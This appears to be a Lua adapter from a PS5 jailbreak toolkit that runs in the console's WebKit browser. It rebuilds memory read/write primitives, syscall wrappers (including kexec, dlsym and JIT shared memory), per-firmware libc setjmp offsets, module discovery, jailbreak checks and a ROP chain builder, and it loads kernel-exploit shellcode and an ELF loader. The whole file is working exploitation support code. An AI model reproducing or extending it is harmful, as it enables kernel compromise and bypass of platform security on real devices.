-- The adapter captures core capabilities before installing reference-style names.
local core_uint64, core_call = uint64, fcall
local core_syscall = syscall.call
local core_memory = {}
for k,v in pairs(memory) do core_memory[k] = v end
local core_write_buffer_large = core_memory.write_buffer_large
core_memory.write_buffer_large = nil
memory.write_buffer_large = nil
local unpack64 = __compat_unpack
__compat_unpack = nil
local gmtime_fields = __compat_gmtime_fields
__compat_gmtime_fields = nil
local track_region = __compat_track_region
__compat_track_region = nil
local untrack_region = __compat_untrack_region
__compat_untrack_region = nil
local syscall_addrs = __compat_syscall_addrs or {}
__compat_syscall_addrs = nil
local run_rop_batch = __compat_run_rop_batch
__compat_run_rop_batch = nil
local core_shared_prefetch = __compat_shared_prefetch
__compat_shared_prefetch = nil
local host_sleep = __compat_host_sleep
__compat_host_sleep = nil

PLATFORM = "ps5"
game_name = "WebKit"
WRITABLE_PATH = "/av_contents/content_tmp/"
RTP_LOOKUP = 0
RTP_SET = 1
RTP_PRIO_REALTIME = 2
PAGE_SIZE = 0x4000
PHYS_PAGE_SIZE = 0x1000
STDIN_FILENO = 0
STDOUT_FILENO = 1
STDERR_FILENO = 2
AF_INET = 2
AF_INET6 = 28
SOCK_STREAM = 1
SOCK_DGRAM = 2
IPPROTO_UDP = 17
IPPROTO_IPV6 = 41
IPV6_PKTINFO = 46
INADDR_ANY = 0
SOL_SOCKET = 0xffff
SO_REUSEADDR = 4
PROT_NONE = 0x0
PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXECUTE = 0x4
GPU_READ = 0x10
GPU_WRITE = 0x20
GPU_RW = 0x30
MAP_SHARED = 0x1
MAP_PRIVATE = 0x2
MAP_FIXED = 0x10
MAP_ANONYMOUS = 0x1000
MAP_NO_COALESCE = 0x400000
O_RDONLY = 0
O_WRONLY = 1
O_RDWR = 2
O_CREAT = 0x100
O_TRUNC = 0x1000
O_APPEND = 0x2000
O_NONBLOCK = 0x4000
SIGILL = 4
SIGBUS = 10
SIGSEGV = 11
SA_SIGINFO = 0x4
LIBKERNEL_HANDLE = 0x2001

local construct_uint64 = __compat_make_uint64_constructor(function(v)
    return (core_uint64(v.h) << 32) | core_uint64(v.l)
end)
__compat_make_uint64_constructor = nil
uint64 = setmetatable({unpack = unpack64}, {__call = construct_uint64})
function is_uint64(v) return type(v) == "userdata" end
function ub8(v) return uint64(v):pack() end
function hex(v) return tostring(uint64(v)) end
local core_format = string.format
string.format = function(fmt, ...)
    local args = { ... }
    for i = 1, #args do
        local v = args[i]
        if type(v) == "number" and math.type(v) == "float" and v % 1 == 0 and v >= -9007199254740991 and v <= 9007199254740991 then
            if v >= -2147483648 and v <= 2147483647 then
                args[i] = math.floor(v)
            end
        end
    end
    local idx = 0
    local patched_fmt = fmt:gsub("%%([%+%-%#0%s%d%.]*[diouxX])", function(spec)
        idx = idx + 1
        local val = args[idx]
        local kind = spec:sub(-1)
        if is_uint64(val) and (kind == "x" or kind == "X") then
            -- pslua's string.format takes a uint64 directly; core_format does not.
            local hex_str = tostring(uint64(val)):sub(3)
            if kind == "X" then hex_str = hex_str:upper() end
            args[idx] = hex_str
            return "%" .. spec:sub(1, -2) .. "s"
        end
        if type(val) == "number" and math.type(val) == "float" and val % 1 == 0 and (val > 2147483647 or val < -2147483648) then
            if kind == "x" or kind == "X" then
                local hex_str = tostring(uint64(val)):sub(3)
                if kind == "X" then hex_str = hex_str:upper() end
                args[idx] = hex_str
                return "%" .. spec:sub(1, -2) .. "s"
            elseif kind == "d" or kind == "i" or kind == "u" then
                args[idx] = core_format("%.0f", val)
                return "%" .. spec:sub(1, -2) .. "s"
            end
        end
        return "%" .. spec
    end)
    return core_format(patched_fmt, table.unpack(args))
end
string.format = __compat_format(core_format, string.format)
__compat_format = nil
function printf(fmt, ...) print(string.format(fmt, ...)) end
function errorf(fmt, ...) error(string.format(fmt, ...), 2) end

for _, pair in ipairs({{"byte",8},{"word",16},{"dword",32},{"qword",64}}) do
    local name,bits = pair[1],pair[2]
    -- Boxed reads are installed directly by the JS profile.
    memory["write_"..name] = core_memory["write"..bits]
end
local function number(n)
    if is_uint64(n) then return n:tonumber() end
    return n
end
memory.read_buffer = __compat_buffer_reader(function(p,n)
    return core_memory.read_buffer(p,number(n))
end)
__compat_buffer_reader = nil
-- The bridge accepts at most 64 KiB per write_buffer call, so a large string
-- (a prefetched elf is 385 KiB) is copied in pieces.
memory.write_buffer = __compat_buffer_writer(function(p, s)
    local text = tostring(s)
    local base = uint64(p)
    -- Most writes fit in one bridge call. Avoid slicing the string, advancing
    -- a pointer, and constructing a second uint64 for the return value.
    if #text <= 65536 then
        if #text > 0 then core_memory.write_buffer(base, text) end
        return base
    end
    if core_write_buffer_large then
        core_write_buffer_large(base, text)
        return base
    end
    local d = base
    local pos, rem = 1, #text
    while rem > 0 do
        local chunk = math.min(rem, 65536)
        core_memory.write_buffer(d, text:sub(pos, pos + chunk - 1))
        d = d + chunk
        pos = pos + chunk
        rem = rem - chunk
    end
    return base
end)
__compat_buffer_writer = nil
function memory.read_null_terminated_string(addr)
    local p = uint64(addr)
    local result = ""
    while true do
        local chunk = core_memory.read_buffer(p, 8)
        local null_pos = chunk:find("\0", 1, true)
        if null_pos then
            return result .. chunk:sub(1, null_pos - 1)
        end
        result = result .. chunk
        p = p + #chunk
    end
end
function memory.memcpy(dest, src, size)
    local rem = number(size)
    local d, s = uint64(dest), uint64(src)
    while rem > 0 do
        local chunk = math.min(rem, 65536)
        core_memory.write_buffer(d, core_memory.read_buffer(s, chunk))
        d = d + chunk
        s = s + chunk
        rem = rem - chunk
    end
    return uint64(dest)
end

local ARENA_PAGE = 65536
local MAX_ARENA_BYTES = 16 * 1024 * 1024
local ZERO_BLOCK = string.rep("\0", 4096)
local arena_regions = {}
local arena_total = 0
local free_blocks = {}
local alloc_sizes = {}
local ring_order = {}
local RING_PINNED_COUNT = 256
local RING_MAX_SIZE = 16384
local alloc_counter = 0
local current_base = nil
local current_offset = 0
local current_capacity = 0

local function zero_range(addr, n)
    local p = uint64(addr)
    local rem = n
    while rem > 0 do
        local chunk = math.min(rem, 4096)
        core_memory.write_buffer(p, chunk == 4096 and ZERO_BLOCK or ZERO_BLOCK:sub(1, chunk))
        p = p + chunk
        rem = rem - chunk
    end
end

local function align_up(v, a)
    return ((math.tointeger(v) + a - 1) // a) * a
end

function memory.free(addr)
    if not addr then return end
    local u = uint64(addr)
    local key = tostring(u)
    local sz = alloc_sizes[key]
    if not sz then return end
    alloc_sizes[key] = nil
    for idx = #ring_order, 1, -1 do
        if ring_order[idx] == u then
            table.remove(ring_order, idx)
        end
    end
    local list = free_blocks[sz]
    if not list then
        list = {}
        free_blocks[sz] = list
    end
    list[#list + 1] = u
end

function memory.reset()
    for _, r in ipairs(arena_regions) do
        untrack_region(r.addr)
        core_syscall(73, r.addr, r.size)
    end
    arena_regions = {}
    arena_total = 0
    free_blocks = {}
    alloc_sizes = {}
    ring_order = {}
    alloc_counter = 0
    current_base = nil
    current_offset = 0
    current_capacity = 0
end

local function allocate_memory(n, clear)
    local raw = number(n)
    if type(raw) ~= "number" or raw <= 0 or raw % 1 ~= 0 then
        error("memory.alloc requires a positive integer size")
    end
    local sz = align_up(raw, 16)
    local list = free_blocks[sz]
    if list and #list > 0 then
        local ptr = table.remove(list)
        if clear then zero_range(ptr, sz) end
        alloc_sizes[tostring(ptr)] = sz
        return ptr
    end
    if not current_base or (current_offset + sz > current_capacity) then
        local map_sz = math.max(ARENA_PAGE, align_up(sz, 16384))
        if arena_total + map_sz > MAX_ARENA_BYTES then
            if sz <= RING_MAX_SIZE then
                for idx = 1, #ring_order do
                    local old_key = tostring(ring_order[idx])
                    if alloc_sizes[old_key] == sz then
                        local old = table.remove(ring_order, idx)
                        if clear then zero_range(old, sz) end
                        ring_order[#ring_order + 1] = old
                        return old
                    end
                end
            end
            error("compat memory arena budget exceeded")
        end
        local mapped = core_syscall(477, 0, map_sz, 3, 0x1002, uint64("0xffffffffffffffff"), 0)
        if mapped == uint64("0xffffffffffffffff") or mapped < uint64(65536) then
            local fallback_sz = math.min(sz, 32768)
            local ptr = core_memory.alloc(fallback_sz)
            alloc_sizes[tostring(ptr)] = sz
            return ptr
        end
        track_region(mapped, map_sz)
        arena_regions[#arena_regions + 1] = { addr = mapped, size = map_sz }
        arena_total = arena_total + map_sz
        current_base = mapped
        current_offset = 0
        current_capacity = map_sz
    end
    local ptr = current_base + current_offset
    current_offset = current_offset + sz
    if clear then zero_range(ptr, sz) end
    alloc_sizes[tostring(ptr)] = sz
    alloc_counter = alloc_counter + 1
    if alloc_counter > RING_PINNED_COUNT and sz <= RING_MAX_SIZE then
        ring_order[#ring_order + 1] = ptr
        if #ring_order > 4096 then
            table.remove(ring_order, 1)
        end
    end
    return ptr
end

memory.alloc = function(n) return allocate_memory(n, true) end

-- Bounded scratch slots are reused across sequential native calls. Native code
-- must not retain these pointers. Payload-owned buffers are required for that.
local scratch = {}
local function arguments(...)
    local args = table.pack(...)
    for i=1,args.n do
        local v = args[i]
        if v == nil then args[i] = 0
        elseif type(v) == "string" then
            if #v >= 4096 then error("compat native string exceeds scratch slot") end
            if not scratch[i] then scratch[i] = core_memory.alloc(4096) end
            core_memory.write_buffer(scratch[i],v.."\0")
            args[i] = scratch[i]
        end
    end
    return table.unpack(args,1,args.n)
end
function fcall(address)
    return function(...) return core_call(address,arguments(...)) end
end
syscall = {}
function syscall.call(n,...) return core_syscall(n,arguments(...)) end

local poll_scratch = nil
local function wait_socket_readable(fd)
    local sfd = number(fd)
    if type(sfd) ~= "number" or sfd < 0 then return true end
    if not poll_scratch then poll_scratch = core_memory.alloc(16) end
    for _ = 1, 300 do
        core_memory.write32(poll_scratch, sfd)
        core_memory.write16(poll_scratch + 4, 1) -- POLLIN
        core_memory.write16(poll_scratch + 6, 0)
        local n = core_syscall(209, poll_scratch, 1, 1000)
        if n == uint64("0xffffffffffffffff") then return true end
        if n ~= uint64(0) then return true end
    end
    return false
end

function syscall.accept(sockfd, addr, addrlen)
    if not wait_socket_readable(sockfd) then
        return uint64("0xffffffffffffffff")
    end
    return syscall.call(30, sockfd, addr, addrlen)
end

function syscall.recvfrom(sockfd, buf, len, flags, addr, addrlen)
    local fl = number(flags or 0)
    if (fl & 0x80) == 0 then
        if not wait_socket_readable(sockfd) then
            return uint64("0xffffffffffffffff")
        end
    end
    return syscall.call(29, sockfd, buf, len, flags, addr, addrlen)
end

local getdents_scratch = nil
local getdents_basep = nil
local getdents_cache = {}
function syscall.getdents(fd, buf, len)
    local raw_len = number(len)
    local raw_fd = number(fd)
    if type(raw_len) == "number" and raw_len > 0 and raw_len < 65536 then
        if not getdents_scratch then
            getdents_scratch = memory.alloc(65536)
            getdents_basep = core_memory.alloc(16)
        end
        local state = getdents_cache[raw_fd]
        if not state or state.pos >= state.total then
            local n = core_syscall(272, fd, getdents_scratch, 65536)
            if n == uint64("0xffffffffffffffff") then
                core_memory.write64(getdents_basep, 0)
                n = core_syscall(196, fd, getdents_scratch, 65536, getdents_basep)
            end
            if n == uint64("0xffffffffffffffff") then
                getdents_cache[raw_fd] = nil
                return n
            end
            local total = n:tonumber()
            if total <= 0 then
                getdents_cache[raw_fd] = nil
                return uint64(0)
            end
            state = { pos = 0, total = total }
            getdents_cache[raw_fd] = state
        end
        local start = state.pos
        local cur = start
        while cur < state.total do
            local reclen = core_memory.read16(getdents_scratch + cur + 4)
            if reclen == 0 or (cur - start + reclen) > raw_len then
                break
            end
            cur = cur + reclen
        end
        local copy_len = cur - start
        if copy_len <= 0 then
            getdents_cache[raw_fd] = nil
            return uint64(0)
        end
        memory.memcpy(buf, getdents_scratch + start, copy_len)
        state.pos = cur
        if state.pos >= state.total then
            getdents_cache[raw_fd] = nil
        end
        return uint64(copy_len)
    end
    local n = syscall.call(272, fd, buf, len)
    if n == uint64("0xffffffffffffffff") then
        if not getdents_basep then getdents_basep = core_memory.alloc(16) end
        core_memory.write64(getdents_basep, 0)
        n = syscall.call(196, fd, buf, len, getdents_basep)
    end
    return n
end

function syscall.close(fd)
    local raw_fd = number(fd)
    if raw_fd then getdents_cache[raw_fd] = nil end
    return syscall.call(6, fd)
end

function syscall.resolve(names)
    for name,n in pairs(names) do
        if type(n) ~= "number" or n < 0 or n % 1 ~= 0 then error("invalid syscall number") end
        local id = n
        local fn
        if id == 30 then
            fn = syscall.accept
        elseif id == 29 then
            fn = syscall.recvfrom
        elseif id == 272 then
            fn = syscall.getdents
        elseif id == 6 then
            fn = syscall.close
        else
            fn = function(...) return syscall.call(id,...) end
        end
        if syscall[name] == nil or id == 30 or id == 29 or id == 272 or id == 6 then
            local addr = syscall_addrs[id] or ((syscall_addrs[20] or uint64(0)) + 7)
            syscall[name] = setmetatable({
                syscall_no = id,
                fn_addr = addr,
            }, {
                __call = function(_, ...) return fn(...) end
            })
        end
    end
end
syscall.resolve({
    read=3, write=4, open=5, close=6, unlink=10, chmod=15, getpid=20, getuid=24,
    recvfrom=29, accept=30, getsockname=32, pipe=42, munmap=73, mprotect=74,
    select=93, socket=97, connect=98, bind=104, setsockopt=105, listen=106,
    gettimeofday=116, getsockopt=118, netgetiflist=125, rename=128, sendto=133,
    socketpair=135, mkdir=136, rmdir=137, stat=188, fstat=189, lstat=190,
    getdirentries=196, sysctl=202, poll=209, clock_gettime=232, nanosleep=240,
    getdents=272, sched_yield=331, thr_exit=431, thr_self=432, thr_new=455,
    rtprio_thread=466, mmap=477, lseek=478, cpuset_getaffinity=487,
    cpuset_setaffinity=488, jitshm_create=533, jitshm_alias=534,
    evf_create=538, evf_delete=539, evf_set=544, evf_clear=545,
    is_in_sandbox=585, dlsym=591, dynlib_load_prx=594, dynlib_unload_prx=595,
    thr_suspend_ucontext=632, thr_resume_ucontext=633, kexec=661,
    aio_multi_delete=662, aio_multi_wait=663, aio_multi_poll=664,
    aio_multi_cancel=666, aio_submit_cmd=669,
})

-- Probe readability without creating or modifying the path. Descriptor zero is valid.
function file_exists(path)
    if type(path) ~= "string" then error("file_exists expects a path string", 2) end
    local fd = syscall.open(path, 0)
    if fd:tonumber() < 0 then return false end
    syscall.close(fd)
    return true
end

-- The loader keeps the kexp shellcode and the elf loader in shared/, which the
-- payload can only read through api.prefetchKexp on the JS side of the bridge.
-- These names are the Lua view of that: shared_bytes("kexp"), shared_bytes("elfldr").
local shared_prefetched = nil

function shared_prefetch()
    if shared_prefetched then return shared_prefetched end
    local kexp_bytes, elf_bytes = core_shared_prefetch()
    shared_prefetched = { kexp = kexp_bytes, elfldr = elf_bytes }
    return shared_prefetched
end

function shared_names()
    shared_prefetch()
    local names = {}
    for name in pairs(shared_prefetched) do names[#names + 1] = name end
    table.sort(names)
    return names
end

function shared_bytes(name)
    shared_prefetch()
    return shared_prefetched[name]
end

function shared_size(name)
    shared_prefetch()
    local data = shared_prefetched[name]
    if not data then return nil end
    return #data
end

-- pslua's io for the savedata files the payload opens read-only.
local IO_READ_CHUNK = 65536
io = {
    open = function(path, mode)
        local flags = 0
        if mode == "wb" or mode == "w+b" then flags = 1 + 0x100 + 0x1000 end
        local fd = syscall.open(path, flags)
        if fd:tonumber() < 0 then return nil end
        local handle = { fd = fd:tonumber() }
        function handle:read(format)
            if format ~= "*a" and format ~= "*all" then return nil end
            local out = {}
            local chunk = memory.alloc(IO_READ_CHUNK)
            while true do
                local got = syscall.read(handle.fd, chunk, IO_READ_CHUNK):tonumber()
                if got <= 0 then break end
                out[#out + 1] = memory.read_buffer(chunk, got)
            end
            return table.concat(out)
        end
        function handle:close()
            if handle.fd then syscall.close(handle.fd) end
            handle.fd = nil
        end
        return handle
    end,
}

local time_scratch = nil
local tm_scratch = nil
local function ensure_time_scratch()
    if not time_scratch then time_scratch = core_memory.alloc(16) end
    return time_scratch
end

function time(tloc)
    local tv = ensure_time_scratch()
    core_syscall(116, tv, 0)
    local sec = uint64(core_memory.read64(tv))
    if tloc and tloc ~= 0 and tloc ~= uint64(0) then
        core_memory.write64(tloc, sec)
    end
    return sec
end

function gmtime_s(timep, result)
    if not timep or not result then return uint64(0) end
    local ts = uint64(core_memory.read64(timep))
    local sec, min, hour, mday, mon, year, wday, yday = gmtime_fields(ts)
    local dst = uint64(result)
    core_memory.write32(dst + 0, sec)
    core_memory.write32(dst + 4, min)
    core_memory.write32(dst + 8, hour)
    core_memory.write32(dst + 12, mday)
    core_memory.write32(dst + 16, mon)
    core_memory.write32(dst + 20, year)
    core_memory.write32(dst + 24, wday)
    core_memory.write32(dst + 28, yday)
    core_memory.write32(dst + 32, 0)
    if alloc_sizes[tostring(dst)] == 48 then
        core_memory.write64(dst + 36, 0)
    end
    return dst
end

function gmtime(timep)
    if not tm_scratch then tm_scratch = memory.alloc(64) end
    return gmtime_s(timep, tm_scratch)
end

os = {
    time = function()
        return time(0):tonumber()
    end,
    clock = function()
        local ts = ensure_time_scratch()
        core_syscall(232, 4, ts)
        local sec = uint64(core_memory.read64(ts)):tonumber()
        local nsec = uint64(core_memory.read64(ts + 8)):tonumber()
        return sec + nsec / 1e9
    end,
}

function sleep(val, unit)
    unit = (unit or "s"):lower()
    local mult = ({ ns = 1, us = 1e3, ms = 1e6, s = 1e9 })[unit]
    if not mult then error("unsupported time unit: " .. tostring(unit)) end
    local total_ns = math.floor(val * mult)
    if host_sleep then
        -- Yield to a JS timer instead of blocking a syscall on the hijacked
        -- worker chain; blocking there trips the PS5 stack check (0xa0020307).
        host_sleep(total_ns)
        return
    end
    local ts = ensure_time_scratch()
    core_memory.write64(ts, math.floor(total_ns / 1e9))
    core_memory.write64(ts + 8, total_ns % 1000000000)
    core_syscall(240, ts, 0)
end

function get_error_string()
    return "native error"
end

function send_ps_notification(text)
    print("[notify] " .. tostring(text))
end

function notify(text)
    print("[notify] " .. tostring(text))
end

function hex_dump(buf, addr)
    addr = addr or 0
    local result = {}
    for i = 1, #buf, 16 do
        local chunk = buf:sub(i, i + 15)
        local hexstr = chunk:gsub(".", function(c)
            return string.format("%02X ", string.byte(c))
        end)
        local ascii = chunk:gsub(".", function(c)
            local byte = string.byte(c)
            return (byte >= 32 and byte <= 126) and c or "."
        end)
        table.insert(result, string.format("%s  %-48s %s", hex(addr + i - 1), hexstr, ascii))
    end
    return table.concat(result, "\n")
end

function memory.hex_dump(addr, size)
    size = size or 0x40
    return hex_dump(memory.read_buffer(addr, size), addr)
end

function memory.read_multiple_qwords(addr, count)
    local qwords = {}
    local buffer = memory.read_buffer(addr, number(count) * 8)
    for i = 0, (#buffer / 8) - 1 do
        table.insert(qwords, uint64.unpack(buffer:sub(i * 8 + 1, i * 8 + 8)))
    end
    return qwords
end

function memory.write_multiple_qwords(addr, list)
    local base = uint64(addr)
    for i, v in ipairs(list) do
        memory.write_qword(base + 8 * (i - 1), v)
    end
end

function align_to(v, n)
    if is_uint64(v) then
        return uint64(math.floor((v:tonumber() * 1.0 + n - 1) / n) * n)
    end
    return math.floor((v * 1.0 + n - 1) / n) * n
end

function align_16(v)
    return align_to(v, 16)
end

function is_jailbroken()
    local cur_uid = syscall.getuid():tonumber()
    local in_sandbox = syscall.is_in_sandbox():tonumber()
    return cur_uid == 0 and in_sandbox == 0
end

function check_jailbroken()
    if not is_jailbroken() then
        error("process is not jailbroken")
    end
end

function get_network_interface_addr()
    local count = syscall.netgetiflist(0, 10):tonumber()
    if count <= 0 then return {} end
    local iface_size = 0x3c0
    local iface_buf = memory.alloc(iface_size * count)
    if syscall.netgetiflist(iface_buf, count):tonumber() < 0 then
        memory.free(iface_buf)
        return {}
    end
    local iface_list = {}
    for i = 0, count - 1 do
        local base = iface_buf + i * iface_size
        local iface_name = memory.read_null_terminated_string(base)
        local iface_ip_buf = memory.read_buffer(base + 0x28, 4)
        local iface_ip_str = string.format("%d.%d.%d.%d",
            string.byte(iface_ip_buf, 1), string.byte(iface_ip_buf, 2),
            string.byte(iface_ip_buf, 3), string.byte(iface_ip_buf, 4))
        if iface_name and #iface_name > 0 then
            iface_list[iface_name] = iface_ip_str
        end
    end
    memory.free(iface_buf)
    return iface_list
end

function get_current_ip()
    local iface_list = get_network_interface_addr()
    for iface_name, iface_ip in pairs(iface_list) do
        if (iface_name == "eth0" or iface_name == "wlan0") and iface_ip ~= "0.0.0.0" and iface_ip ~= "127.0.0.1" then
            return iface_ip
        end
    end
    for _, iface_ip in pairs(iface_list) do
        if iface_ip ~= "0.0.0.0" and iface_ip ~= "127.0.0.1" then
            return iface_ip
        end
    end
    return "127.0.0.1"
end

unpack = table.unpack
struct = {
    pack = function(fmt, ...)
        local args = { ... }
        for i = 1, #args do
            if is_uint64(args[i]) then args[i] = args[i]:tonumber() end
        end
        return string.pack(fmt, table.unpack(args))
    end,
    unpack = function(fmt, s, pos)
        return string.unpack(fmt, s, pos)
    end,
}

local fw_setjmp_offsets = {
    ["7.00"] = 0x5AF10, ["7.01"] = 0x5AF10, ["7.20"] = 0x5AF10,
    ["7.40"] = 0x5AF10, ["7.60"] = 0x5AF10, ["7.61"] = 0x5AF10,
    ["8.00"] = 0x5A860, ["8.20"] = 0x5A860, ["8.40"] = 0x5A860, ["8.60"] = 0x5A860,
    ["9.00"] = 0x5A380, ["9.05"] = 0x5A380, ["9.20"] = 0x5A380,
    ["9.40"] = 0x5A380, ["9.60"] = 0x5A380,
    ["10.00"] = 0x5A2B0, ["10.01"] = 0x5A2B0, ["10.20"] = 0x5A2B0,
    ["10.40"] = 0x5A2B0, ["10.60"] = 0x5A2B0,
    ["11.00"] = 0x5AD30, ["11.20"] = 0x5AD30, ["11.40"] = 0x5AD30, ["11.60"] = 0x5AD30,
    ["12.00"] = 0x5B850, ["12.02"] = 0x5B850, ["12.20"] = 0x5B850,
    ["12.40"] = 0x5B850, ["12.60"] = 0x5B850, ["12.70"] = 0x5B850,
    ["13.00"] = 0x5D990, ["13.20"] = 0x5D990, ["13.40"] = 0x5D990,
    ["13.42"] = 0x5D990, ["13.60"] = 0x5D990,
}

-- The bridge ships window.SYMBOLS as absolute addresses; the addrofs tables are the
-- Lua view of the same offsets the .js kernel exploits use, so imports resolve
-- without dlsym. Names the table does not carry keep the string sentinel behavior.
libc_addrofs = setmetatable({}, {
    __index = function(_, k)
        local symbol = symbols and symbols.libc and symbols.libc[k]
        if symbol then return symbol end
        local setjmp_off = fw_setjmp_offsets[FW_VERSION] or 0x5AF10
        if k == "setjmp" then
            return libc_base + setjmp_off
        elseif k == "longjmp" then
            return libc_base + (setjmp_off + 0x50)
        end
        return "__compat_libc_" .. tostring(k)
    end
})

libkernel_addrofs = setmetatable({}, {
    __index = function(_, k)
        local symbol = symbols and symbols.libkernel and symbols.libkernel[k]
        if symbol then return symbol end
        return "__compat_libkernel_" .. tostring(k)
    end
})

local compat_fcall = fcall
function fcall(address)
    if address == "__compat_libc_calloc" then
        return function(nmemb, size) return memory.alloc(number(nmemb) * number(size)) end
    elseif address == "__compat_libc_memcpy" then
        return function(dest, src, size) return memory.memcpy(dest, src, size) end
    elseif address == "__compat_libc_time" then
        return function(tloc) return time(tloc) end
    elseif address == "__compat_libc_gmtime" then
        return function(timep) return gmtime(timep) end
    elseif address == "__compat_libc_gmtime_s" then
        return function(timep, res) return gmtime_s(timep, res) end
    elseif address == "__compat_libc_strerror" then
        return function()
            local p = memory.alloc(16)
            memory.write_buffer(p, "native error\0")
            return p
        end
    elseif address == "__compat_libc_error" then
        return function()
            local p = memory.alloc(8)
            memory.write_qword(p, 1)
            return p
        end
    end
    return compat_fcall(address)
end

package = {
    path = "/savedata0/?.lua",
    loaded = {},
    preload = {},
}

local builtin_modules = {
    globals = true, offsets = true, misc = true, bit32 = true,
    hash = true, uint64 = true, struct = true, lua = true,
    memory = true, ropchain = true, syscall = true, signal = true,
    native = true, thread = true, kernel_offset = true, kernel = true,
    gpu = true,
}

function loadstring(str, chunkname)
    return load(str, chunkname, "t", _G)
end

function setfenv(fn, env)
    return fn
end

function require(modname)
    if package.loaded[modname] ~= nil then
        return package.loaded[modname]
    end
    if package.preload[modname] then
        local res = package.preload[modname](modname)
        if res == nil then res = true end
        package.loaded[modname] = res
        return res
    end
    if builtin_modules[modname] then
        package.loaded[modname] = true
        return true
    end
    error(string.format("module '%s' not found", tostring(modname)), 2)
end

function run_with_coroutine(f)
    local ok, err = pcall(f)
    if not ok then
        return tostring(err)
    end
    return nil
end

function run_nogc(f)
    collectgarbage("stop")
    f()
    collectgarbage("restart")
end

lua = {
    resolve_value = function(v)
        if type(v) == "string" then
            -- The string and trailing NUL overwrite every byte in this region.
            local buf = allocate_memory(#v + 1, false)
            if #v > 0 then memory.write_buffer(buf, v) end
            memory.write_byte(buf + #v, 0)
            return buf
        elseif type(v) == "number" then
            return uint64(v)
        elseif is_uint64(v) then
            return v
        end
        errorf("lua.resolve_value: invalid type (%s)", type(v))
    end,
}

bump = {
    alloc = function(size) return memory.alloc(size) end,
}

function find_pattern(buffer, pattern)
    local pat = pattern:gsub("%S+", function(b)
        return b == "?" and "." or string.char(tonumber(b, 16))
    end):gsub("%s+", "")
    local matches, start = {}, 1
    while true do
        local s = buffer:find(pat, start)
        if not s then break end
        matches[#matches + 1], start = s, s + 1
    end
    return matches
end

function sysctl_name2oid(name)
    local translate_name_mib = memory.alloc(0x8)
    local buf_size = 0x70
    local oid_buf = memory.alloc(buf_size)
    local size = memory.alloc(0x8)
    memory.write_qword(translate_name_mib, 0x300000000)
    memory.write_qword(size, buf_size)
    if syscall.sysctl(translate_name_mib, 2, oid_buf, size, name, #name):tonumber() < 0 then
        return nil, 0
    end
    local oid_len = memory.read_qword(size):tonumber() / 4
    return oid_buf, oid_len
end

function sysctlbyname(name, oldp, oldp_len, newp, newp_len)
    local mib, mib_len = sysctl_name2oid(name)
    if not mib then
        errorf("failed to translate sysctl name to mib (%s)", name)
    end
    if syscall.sysctl(mib, mib_len, oldp, oldp_len, newp, newp_len):tonumber() < 0 then
        return false
    end
    return true
end

function create_pipe()
    local fildes = memory.alloc(0x10)
    if syscall.pipe(fildes):tonumber() == -1 then
        error("pipe() error: " .. get_error_string())
    end
    local read_fd = memory.read_dword(fildes):tonumber()
    local write_fd = memory.read_dword(fildes + 4):tonumber()
    return read_fd, write_fd
end

function map_fixed_address(addr, size)
    local MAP_COMBINED = bit32.bor(MAP_PRIVATE, MAP_FIXED, MAP_ANONYMOUS)
    local PROT_COMBINED = bit32.bor(PROT_READ, PROT_WRITE)
    local ret = syscall.mmap(addr, size, PROT_COMBINED, MAP_COMBINED, -1, 0)
    if ret:tonumber() < 0 then
        error("mmap() error: " .. get_error_string())
    end
    return ret
end

function dlsym(handle, sym)
    if PLATFORM == "ps5" and (tonumber(FW_VERSION) or 0) >= 5 then
        check_jailbroken()
    end
    assert(type(sym) == "string")
    local addr_out = memory.alloc(0x8)
    if syscall.dlsym(handle, sym, addr_out):tonumber() == -1 then
        error("dlsym() error: " .. get_error_string())
    end
    return memory.read_qword(addr_out)
end

function find_mod_by_name(name)
    local sceKernelGetModuleListInternal = fcall(dlsym(LIBKERNEL_HANDLE, "sceKernelGetModuleListInternal"))
    local sceKernelGetModuleInfo = fcall(dlsym(LIBKERNEL_HANDLE, "sceKernelGetModuleInfo"))
    local mem = memory.alloc(4 * 0x300)
    local actual_num = memory.alloc(8)
    sceKernelGetModuleListInternal(mem, 0x300, actual_num)
    local num = memory.read_qword(actual_num):tonumber()
    for i = 0, num - 1 do
        local handle = memory.read_dword(mem + i * 4)
        local info = memory.alloc(0x160)
        memory.write_qword(info, 0x160)
        sceKernelGetModuleInfo(handle, info)
        local mod_name = memory.read_null_terminated_string(info + 8)
        if name == mod_name then
            local base_addr = memory.read_qword(info + 0x108)
            return { handle = handle, base_addr = base_addr }
        end
    end
    return nil
end

function serialize(t)
    local function ser(o)
        if type(o) == "number" or type(o) == "boolean" then
            return tostring(o)
        elseif type(o) == "string" then
            return string.format("%q", o)
        elseif is_uint64(o) then
            return string.format("uint64(%q)", hex(o))
        elseif type(o) == "table" then
            local s = "{"
            for k, v in pairs(o) do
                local key = type(k) == "string" and ("[" .. string.format("%q", k) .. "]") or ("[" .. tostring(k) .. "]")
                s = s .. key .. "=" .. ser(v) .. ","
            end
            return s .. "}"
        else
            return "nil"
        end
    end
    return ser(t)
end

function deserialize(s)
    local env = setmetatable({ uint64 = uint64 }, { __index = _G })
    local f = assert(load("return " .. s, "deserialize", "t", env))
    return f()
end

storage = { data = {} }
function storage.set(k, v)
    assert(type(k) == "string")
    storage.data[k] = serialize(v)
end
function storage.get(k)
    if not storage.data[k] then return nil end
    return deserialize(storage.data[k])
end
function storage.del(k) storage.data[k] = nil end
function storage.list()
    local out = { "storage list:" }
    for k, v in pairs(storage.data) do
        if #v < 128 then
            table.insert(out, string.format("%s => %s", k, v))
        else
            table.insert(out, string.format("%s => ... (size = %d bytes)", k, #v))
        end
    end
    return table.concat(out, "\n")
end

ropchain = {}
ropchain.__index = ropchain
setmetatable(ropchain, {
    __call = function(_, opt) return ropchain:new(opt) end
})

function ropchain:new(opt)
    opt = opt or {}
    local self = setmetatable({}, ropchain)
    -- Recorded host batches do not need a materialized Lua-side ROP stack.
    self.ops_only = opt.ops_only == true and run_rop_batch ~= nil
    self.stack_size = opt.stack_size or 0x2000
    self.stack_base = self.ops_only and uint64(0)
        or (opt.stack_base and uint64(opt.stack_base) or memory.alloc(self.stack_size))
    self.align_offset = 0
    self.stack_offset = 0
    self.retval_addr = {}
    self.ops = {}
    if not self.ops_only then self:push_ret() end
    if not self.ops_only and self.stack_base:tonumber() % 16 ~= 0 then
        local jmp_to = align_16(self.stack_base + self.stack_offset) + 0x20
        self:push_set_rsp(jmp_to)
        self.align_offset = jmp_to - self.stack_base
        self.stack_offset = 0
    end
    return self
end

function ropchain:get_rsp()
    return self.stack_base + self.align_offset + self.stack_offset
end

